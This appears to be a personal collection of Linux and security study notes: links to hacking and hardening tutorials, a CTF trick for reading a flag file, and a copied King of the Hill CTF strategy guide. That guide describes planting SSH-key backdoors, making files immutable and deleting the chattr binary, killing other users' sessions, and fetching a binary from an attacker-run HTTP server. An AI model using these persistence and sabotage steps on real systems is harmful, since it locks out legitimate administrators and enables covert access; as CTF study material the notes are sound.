IPv4Address('192.168.0.244'), IPv4Address('192.168.0.245'), IPv4Address('192.168.0.246'), IPv4Address('192.168.0.247'), IPv4Address('192.168.0.248'), IPv4Address('192.168.0.249'), IPv4Address('192.168.0.250'), IPv4Address('192.168.0.251'), IPv4Address('192.168.0.252'), IPv4Address('192.168.0.253'), IPv4Address('192.168.0.254'), IPv4Address('192.168.0.255')] '''
```





---


[Ethical Hacking 101 with Linux — A Booklet | by Audrey's weBlog & reViews - Freedium](https://freedium.cfd/https://medium.com/@audrey_evans/ethical-hacking-101-with-linux-a-booklet-32a06a4c6533)

-- 49 minutes read

[Learning Networks with Linux: Circumventing MAC Address Filtering | by Audrey's weBlog & reViews | in OSINT TEAM - Freedium](https://freedium.cfd/https://medium.com/the-first-digit/learning-networks-with-linux-circumventing-mac-address-filtering-fcd5962ac387?source=explore---------2-98--------------------b027ae1f_4399_42f0_bd7b_c475b5bf91f1-------15)

[Learning Networks with Linux: Uncovering Hidden Wi-Fi Network Name (SSID) | by Audrey's weBlog & reViews - Freedium](https://freedium.cfd/https://medium.com/the-first-digit/learning-networks-with-linux-uncovering-hidden-wi-fi-network-name-ssid-e4413f2360c2)


[Linux Server Hardening and Compliance: A Basic Tutorial | by Lyron Foster - Freedium](https://freedium.cfd/https://medium.com/@lfoster49203/linux-server-hardening-and-compliance-a-basic-tutorial-abdbd5ad7e34)
-- security

[Linux: How to find files with specific extensions and scp them to another host | by Konstantinos Patronas - Freedium](https://freedium.cfd/https://medium.com/@kpatronas/linux-how-to-find-files-with-specific-extensions-and-scp-them-to-another-host-d2eae821afa1)

[Linux Network Administrator’s Guide | by Ashish Singh | DevOps.dev (medium.com)](https://medium.com/devops-dev/linux-network-administrators-guide-e8f19a6e0ef1)


Linux Kernel Teaching:
☢️ https://linux-kernel-labs.github.io/refs/heads/master/index.html

https://www.youtube.com/watch?v=Rltbz1z-hLU

https://youtu.be/xWF38MY3y6o?si=0db56kbaMhoX6lDs  60 questions linux


----


## "Erase" data from hardrivers

https://youtube.com/shorts/bVmukCdg7SQ?si=1t6hUnwLSCSbIzpI


---

## No Tools CTF:

![[Pasted image 20240722093213.png]]

> read OUTPUT < /home/ctf/flag.txt

Now we store it into the variable "OUTPUT" and just echo the variable:

> echo OUTPUT

![[Pasted image 20240722093612.png]]


https://youtube.com/shorts/iUHfq_JN4G8?si=UNcCAPxR6sQxfZxR


https://youtu.be/xCX14u9XzE8?si=VZHU3yvtu9ksIVCP


[How to hide a file inside another file | by Konstantinos Patronas | Jun, 2024 | Medium (lovethepenguin.com)](https://lovethepenguin.com/how-to-hide-a-file-inside-another-file-f0b2075b5b82)


https://piotrzan.medium.com/the-zsh-shell-tricks-i-wish-id-known-earlier-ae99e91c53c2?source=read_next_recirc-----f0b2075b5b82----0---------------------f82c4c98_9e7d_40d7_bfd3_bed458b948af-------

https://medium.com/@audrey_evans/learning-networks-with-linux-firewalls-c893ebe3e9a8


Wyvern is a kernel driver designed to facilitate the transmission and reception of memory from any process via the computer's kernel
https://github.com/SnyakoCode/wyvernkernel


linux PAM Attack?

https://www.youtube.com/watch?v=pxzUdiRPBq4

linux beginner to enterprise?: https://www.youtube.com/watch?v=uR4r027EE88

https://www.youtube.com/watch?v=_Q9OLNiQZxE:  How to find ANYTHING from the command line -- newb guide

da fare:

<iframe width="1266" height="480" src="https://www.youtube.com/embed/fwGqm8T9drI" title="Become an Awe$ome Linux SysAdmin In Under 2 Hours" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---

In case of this problem:

![[Pasted image 20240812230835.png]]

1* find the process causing the problem:

2* kill the process and  clean it up to avoid further issues:

![[Pasted image 20240812230928.png]]

## reate qr code in linux

> sudo  apt install qrencode

-> write what you want to specify in the qrcode and then specify the file:

![[Pasted image 20240821123842.png]]
You will be able to view the qrcode and then open it:

![[Pasted image 20240821124210.png]]

how linux kernel prints text on screen:


[How Linux Kernel Prints Text on Screen - YouTube](https://www.youtube.com/watch?v=aAuw2EVCBBg)


https://www.youtube.com/watch?v=_fE24FoKNag


---

https://www.youtube.com/watch?v=fANSL7LOazg


1. Hiding Linux Processes with Bind Mounts
https://righteousit.com/2024/07/24/hiding-linux-processes-with-bind-mounts


https://www.youtube.com/watch?v=V-I3OLB8gy0 forensics

---

#source: [King Of The Hill Strategies. Stragegy | by ASTUTE | Medium](https://medium.com/@prakashchand72/king-of-the-hill-strategies-80a5b1f89c65)

##  King Of The Hill Strategies

**Stragegy**

`try to get into root and echo your name on king.txt` `this gives you contant point which is better than finding flag`

**Scan**

_do rustscan than namp  
rustscan gives quicker scan result_  
  
**backdoor**

always make a backdoor once you get into the shell  
`incase someone kill you on shell` `or` `shell got disconnected you have your backdoor`  
  
**how to create the backdoor**

`generate ssh keygen` `ssh-keygen`  
  
**defend your ssh key**  
  
`if someone finds your ssh there is high chance that they delete your key` `so it’s better if you defend your ssh key`  
  
`try to put your ssh on some unexpected place like /etc /usr`  
  
`make your ssh immutable so that no one can delete` `with following command`

> chattr -R +i .ssh

`now you likely to do is to delete the chattr binary from /usr/bin so that no one can make it mutable again`  
  
***Ultimate Defences***  
  
`now you need to defend your position`  
  
`try the same`  
`once you put your name on king.txt` `make it immutable` `with the command chattr just like above on ssh`

> chattr +i /root/king.txt

`now delete the chattr again`

or

Run a while loop to echo your name on king.txt so that if any one even change the name then after a second that king.txt again contains your name again

```
while true; do echo “prakashchand72” > king.txt ; done 
```

now you can start find other flag

```
find \ -name flag.txt 2>/dev/null
```

sometime you can also kill other user from shell  
  
`type`

> who

this shows the ip and pty number  
find which is your pty and seeing your ip and start kill others pty

> ps aux | grep “pty”

or

> ps aux | grep “ssh”

now get the proccess of id of other and kill them

> kill {pid no here}

**commmunicate with others**

you can also broadcast the message to others on the shell with the wall command

>wall hello this is prakash

**Breaking the Defence**

if you got situation when someone does _chattr +i king.txt_ then you can uplaod your own chattr and make it mutable again  
  
`on your local machine go to your /usr/bin and transfer the file of chattr to the machine`  
  
_something like_

```
python3 -m http.server 8080  
   
 wget ip:8080/chattr   
   
 chmod +x chattr   
   
 _now on your king.txt_
   
 chattr -i king.txt
```

Unbreakable Defence own exploit


```
while true; do “prakashchand72 is the king”; done
```

---

[Secret Linux Commands: The Ones Your Teacher Never Told You About | by Satyam Pathania | in InfoSec Write-ups - Freedium](https://freedium.cfd/https://infosecwriteups.com/secret-linux-commands-the-ones-your-teacher-never-told-you-about-f7c3843b06b7)


<iframe width="928" height="522" src="https://www.youtube.com/embed/QlzoegSuIzg" title="Making Simple Linux Distro from Scratch" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>